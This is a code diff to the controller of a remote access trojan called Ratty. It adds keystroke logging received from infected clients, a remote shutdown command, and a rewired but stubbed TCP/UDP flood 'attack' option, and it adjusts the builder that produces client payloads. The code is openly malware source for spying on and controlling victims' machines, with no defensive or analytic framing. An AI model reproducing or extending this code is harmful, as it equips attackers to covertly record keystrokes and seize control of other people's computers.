@@ -15,7 +15,6 @@ import java.util.stream.Stream;
 import javax.imageio.ImageIO;
 import javax.swing.ImageIcon;
 import javax.swing.JFileChooser;
-import javax.swing.JOptionPane;
 import javax.swing.filechooser.FileFilter;
 import javax.swing.filechooser.FileNameExtensionFilter;
 
@@ -28,7 +27,6 @@ import de.sogomn.rat.gui.FileTree;
 import de.sogomn.rat.gui.FileTreeNode;
 import de.sogomn.rat.gui.IGuiController;
 import de.sogomn.rat.gui.Notification;
-import de.sogomn.rat.packet.AttackPacket;
 import de.sogomn.rat.packet.AudioPacket;
 import de.sogomn.rat.packet.ChatPacket;
 import de.sogomn.rat.packet.ClipboardPacket;
@@ -44,10 +42,12 @@ import de.sogomn.rat.packet.FileRequestPacket;
 import de.sogomn.rat.packet.FreePacket;
 import de.sogomn.rat.packet.IPacket;
 import de.sogomn.rat.packet.InformationPacket;
+import de.sogomn.rat.packet.KeylogPacket;
 import de.sogomn.rat.packet.NewDirectoryPacket;
 import de.sogomn.rat.packet.PingPacket;
 import de.sogomn.rat.packet.PopupPacket;
 import de.sogomn.rat.packet.ScreenshotPacket;
+import de.sogomn.rat.packet.ShutdownPacket;
 import de.sogomn.rat.packet.UninstallPacket;
 import de.sogomn.rat.packet.UploadFilePacket;
 import de.sogomn.rat.packet.VoicePacket;
@@ -112,9 +112,9 @@ public final class RattyGuiController extends AbstractRattyController implements
 	private static final String YES = LANGUAGE.getString("server.yes");
 	private static final String NO = LANGUAGE.getString("server.no");
 	private static final String CANCEL = LANGUAGE.getString("server.cancel");
-	private static final String OPTION_TCP = LANGUAGE.getString("server.tcp");
-	private static final String OPTION_UDP = LANGUAGE.getString("server.udp");
-	private static final String ATTACK_MESSAGE = LANGUAGE.getString("server.attack_message");
+//	private static final String OPTION_TCP = LANGUAGE.getString("server.tcp");
+//	private static final String OPTION_UDP = LANGUAGE.getString("server.udp");
+//	private static final String ATTACK_MESSAGE = LANGUAGE.getString("server.attack_message");
 	private static final String BUILDER_ERROR_MESSAGE = LANGUAGE.getString("builder.error");
 	private static final String URL_MESSAGE = LANGUAGE.getString("server.url_message");
 	private static final String AMOUNT_QUESTION = LANGUAGE.getString("server.amount_question");
@@ -475,27 +475,30 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private void launchAttack() {
-		final int input = gui.showOptions(ATTACK_MESSAGE, OPTION_TCP, OPTION_UDP, CANCEL);
+		gui.showMessage("Not implemented yet");//TODO Remove
 		
-		final AttackPacket packet = null;
-		
-		if (input == JOptionPane.YES_OPTION) {
-			//packet = new AttackPacket(AttackPacket.TCP, address, port, duration);
-		} else if (input == JOptionPane.NO_OPTION) {
-			//packet = new AttackPacket(AttackPacket.UDP, address, port, duration);
-		} else {
-			return;
-		}
-		
-		broadcast(packet);
+//		final int input = gui.showOptions(ATTACK_MESSAGE, OPTION_TCP, OPTION_UDP, CANCEL);
+//		
+//		final AttackPacket packet = null;
+//		
+//		if (input == JOptionPane.YES_OPTION) {
+//			//packet = new AttackPacket(AttackPacket.TCP, address, port, duration);
+//		} else if (input == JOptionPane.NO_OPTION) {
+//			//packet = new AttackPacket(AttackPacket.UDP, address, port, duration);
+//		} else {
+//			return;
+//		}
+//		
+//		broadcast(packet);
 	}
 	
 	private void build() {
-		if (selectedBuilderFile == null) {
+		final String[] entries = builder.getListEntries();
+		
+		if (selectedBuilderFile == null || entries.length == 0) {
 			return;
 		}
 		
-		final String[] entries = builder.getListEntries();
 		final String dataReplacementString = Stream.of(entries).collect(Collectors.joining("\r\n"));
 		final byte[] dataReplacement = dataReplacementString.getBytes();
 		
@@ -512,6 +515,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 		} catch (final IOException ex) {
 			gui.showError(BUILDER_ERROR_MESSAGE + System.lineSeparator() + ex);
 		} finally {
+			builder.removeListEntries();
 			builder.setVisible(false);
 		}
 	}
@@ -562,6 +566,8 @@ public final class RattyGuiController extends AbstractRattyController implements
 			requestFile(client);
 		} else if (command == RattyGui.CHAT) {
 			client.chat.setVisible(true);
+		} else if (command == RattyGui.KEYLOG) {
+			client.logger.setVisible(true);
 		}
 	}
 	
@@ -575,7 +581,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 		} else if (command == BuilderGui.BUILD) {
 			build();
 		} else if (command == RattyGui.ATTACK) {
-			//launchAttack();
+			launchAttack();
 		} else if (command == BuilderGui.ADD) {
 			addBuilderEntry();
 		} else if (command == BuilderGui.REMOVE) {
@@ -626,6 +632,8 @@ public final class RattyGuiController extends AbstractRattyController implements
 			packet = new ComputerInfoPacket();
 		} else if (command == RattyGui.UNINSTALL) {
 			packet = createUninstallPacket();
+		} else if (command == RattyGui.SHUT_DOWN) {
+			packet = new ShutdownPacket();
 		} else if (command == DisplayPanel.MOUSE_EVENT && client.isStreamingDesktop()) {
 			packet = client.displayPanel.getLastMouseEventPacket();
 		} else if (command == DisplayPanel.KEY_EVENT && client.isStreamingDesktop()) {
@@ -752,6 +760,12 @@ public final class RattyGuiController extends AbstractRattyController implements
 		gui.showMessage(message);
 	}
 	
+	private void handleKeylog(final ServerClient client, final KeylogPacket packet) {
+		final int keyCode = packet.getKeyCode();
+		
+		client.logger.log(keyCode);
+	}
+	
 	private boolean handlePacket(final ServerClient client, final IPacket packet) {
 		final Class<? extends IPacket> clazz = packet.getClass();
 		
@@ -793,8 +807,12 @@ public final class RattyGuiController extends AbstractRattyController implements
 			final FileInformationPacket information = (FileInformationPacket)packet;
 			
 			handleFileInformation(client, information);
-		} else if (clazz == FreePacket.class) {
-			//To prevent shutdown
+		} else if (clazz == KeylogPacket.class) {
+			final KeylogPacket log = (KeylogPacket)packet;
+			
+			handleKeylog(client, log);
+		} else if (clazz == FreePacket.class || clazz == ShutdownPacket.class) {
+			//To prevent them from executing
 		} else {
 			consumed = false;
 		}
@@ -833,6 +851,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 		client.addListener(this);
 		
 		gui.addClient(client);
+		gui.update();
 		
 		if (shouldNotify) {
 			final Notification notification = new Notification(name + " " + address, icon);
